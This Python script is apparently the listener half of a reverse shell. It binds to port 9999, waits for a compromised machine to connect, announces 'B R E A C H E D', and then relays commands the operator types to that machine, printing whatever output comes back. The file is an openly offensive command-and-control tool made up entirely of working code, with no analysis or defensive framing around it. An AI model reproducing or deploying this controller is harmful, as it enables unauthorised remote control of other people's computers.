import sys
import socket


# Creation Of Socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Error creating socket: " + str(msg))


# Binding
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Error binding socket: " + str(msg))
        socket_bind()


# Connection
def socket_accept():
    conn, address = s.accept()
    print("Connecting...")
    print("Connection Established Successfully.")
    print("IP: " + address[0] + " Port: " + str(address[1]))
    print("-------B R E A C H E D-------")
    print("Terminal>",end="")
    send_commands(conn)
    conn.close()


# Send Commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")  # It will show the cursor right beside the terminal session prompt


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()






